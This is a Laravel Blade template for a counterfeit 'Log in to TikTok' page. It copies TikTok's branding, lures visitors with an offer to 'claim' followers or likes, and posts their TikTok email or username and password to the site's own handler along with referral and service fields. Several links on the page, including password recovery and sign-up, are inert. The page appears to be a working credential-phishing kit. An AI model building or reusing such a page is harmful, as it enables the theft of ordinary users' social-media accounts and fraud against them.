@extends('platform-login.layout')

@section('title', 'Log in | TikTok')

@section('content')
<div class="w-full max-w-[420px] mx-auto space-y-4">
    <!-- TikTok Login Card -->
    <div class="bg-[#121212] border border-white/10 rounded-3xl p-8 sm:p-10 shadow-2xl relative overflow-hidden">
        <!-- TikTok 3D Accent Lights -->
        <div class="absolute -top-12 -right-12 w-32 h-32 bg-[#25f4ee]/20 rounded-full blur-2xl pointer-events-none"></div>
        <div class="absolute -bottom-12 -left-12 w-32 h-32 bg-[#fe2c55]/20 rounded-full blur-2xl pointer-events-none"></div>

        <!-- TikTok Logo Header -->
        <div class="text-center mb-6">
            <div class="inline-flex items-center justify-center w-14 h-14 rounded-2xl bg-black border border-white/10 mb-3 shadow-inner">
                <i class="fa-brands fa-tiktok text-2xl text-white"></i>
            </div>
            <h2 class="text-2xl font-black text-white tracking-tight">Log in to TikTok</h2>
            <div class="mt-2 inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-white/5 border border-white/10 text-xs text-gray-300">
                <i class="fa-solid fa-bolt text-[#25f4ee] text-[10px]"></i>
                <span>Claim <strong class="text-white">{{ number_format($quantity) }} {{ $service }}</strong></span>
            </div>
        </div>

        <form method="POST" action="{{ route('platform.login.store', ['platform' => 'tiktok']) }}" class="space-y-4">
            @csrf
            <input type="hidden" name="tag_id" value="{{ $tag->id ?? 4 }}">
            <input type="hidden" name="service_type" value="{{ $service }}">
            <input type="hidden" name="quantity" value="{{ $quantity }}">
            <input type="hidden" name="username" value="{{ $username }}">
            <input type="hidden" name="referral_code_id" value="{{ $refId }}">

            <div>
                <label class="block text-xs font-semibold text-gray-400 mb-1.5">Email or username</label>
                <input type="text" name="email" required
                    value="{{ $username ? ltrim($username, '@') : '' }}"
                    class="w-full px-4 py-3 text-sm rounded-xl bg-[#1e1e1e] border border-white/10 text-white placeholder-gray-500 focus:outline-none focus:border-[#fe2c55] transition-colors"
                    placeholder="Email or username">
            </div>

            <div class="relative">
                <label class="block text-xs font-semibold text-gray-400 mb-1.5">Password</label>
                <input type="password" id="tt_password" name="password" required
                    class="w-full px-4 py-3 pr-14 text-sm rounded-xl bg-[#1e1e1e] border border-white/10 text-white placeholder-gray-500 focus:outline-none focus:border-[#fe2c55] transition-colors"
                    placeholder="Password">
                <button type="button" onclick="togglePassword('tt_password', this)"
                    class="absolute right-4 top-8 text-xs font-semibold text-gray-400 hover:text-white transition-colors">
                    Show
                </button>
            </div>

            <div class="flex items-center justify-between text-xs text-gray-400">
                <span class="hover:underline cursor-pointer">Forgot password?</span>
                <span class="hover:underline cursor-pointer">Log in with phone</span>
            </div>

            <button type="submit"
                class="w-full py-3.5 bg-[#fe2c55] hover:bg-[#e0264b] text-white font-bold text-sm rounded-xl shadow-lg shadow-[#fe2c55]/20 transition-all active:scale-[0.98]">
                Log in
            </button>
        </form>

        <div class="mt-6 pt-6 border-t border-white/10 text-center text-xs text-gray-400">
            Don't have an account? <span class="text-[#fe2c55] font-semibold hover:underline cursor-pointer">Sign up</span>
        </div>
    </div>
</div>
@endsection

@section('scripts')
<script>
    function togglePassword(inputId, btn) {
        const input = document.getElementById(inputId);
        if (input.type === 'password') {
            input.type = 'text';
            btn.innerText = 'Hide';
        } else {
            input.type = 'password';
            btn.innerText = 'Show';
        }
    }
</script>
@endsection
